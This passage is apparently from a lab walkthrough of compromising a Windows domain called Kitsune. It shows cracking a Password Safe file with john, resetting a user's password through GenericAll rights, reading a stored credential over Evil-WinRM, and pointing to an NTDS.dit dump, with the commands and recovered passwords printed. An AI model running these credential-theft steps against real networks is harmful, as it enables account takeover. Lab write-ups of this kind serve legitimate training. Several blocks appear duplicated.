I did not find the documents interesting. However, the PWSafe file is interesting as it could contain saved passwords. Using pwsafe2john, I obtained the password hash and cracked it offline using john to retrieve the password hellokitty :

┌──(kali㉿kali)-[~/Desktop/Labs/Kitsune]
└─$ pwsafe2john logins.psafe3 > hash.txt
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/Labs/Kitsune]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Using pwsafe and the password hellokitty, I opened the content:

I notice there are three saved passwords, with one belonging to the user ranch which I discovered earlier:

When viewing the password of user ranch, I obtained the plaintext R@nch2026!:

I extracted three passwords in total:

I#zmE{z[n3HM
R@nch2026!
a%KlRhqbuRgL
I#zmE{z[n3HM
R@nch2026!
a%KlRhqbuRgL

Upon checking the domain data, I notice the users of Helpdesk group have GenericAll over the schlop user:

Then I changed the password of the user schlop using bloodyAD:

┌──(kali㉿kali)-[~/Desktop/Labs/Kitsune]
└─$ export KRB5CCNAME=ranch.ccache

This schlop user belongs to the Remote Management Users group which means we can use WinRM on the DC:

And since WinRM port is open, we can authenticate to it successfully:

Then using Export-Clixml, I obtained the password PebbleIs47!:

*Evil-WinRM* PS C:\Users\schlop\Documents> $cred = Import-Clixml -Path "C:\Users\schlop\Documents\networkAuth.cred"
*Evil-WinRM* PS C:\Users\schlop\Documents> $cred.GetNetworkCredential().Password
PebbleIs47!
*Evil-WinRM* PS C:\Users\schlop\Documents> $cred = Import-Clixml -Path "C:\Users\schlop\Documents\networkAuth.cred"
*Evil-WinRM* PS C:\Users\schlop\Documents> $cred.GetNetworkCredential().Password
PebbleIs47!

When checking the group membership, I notice svc_gmsa$ belongs to the Backup Operators group:

NetExec has the module backup_operator which can be used to extract the NTDS.dit database. I used this to extract the credentials:
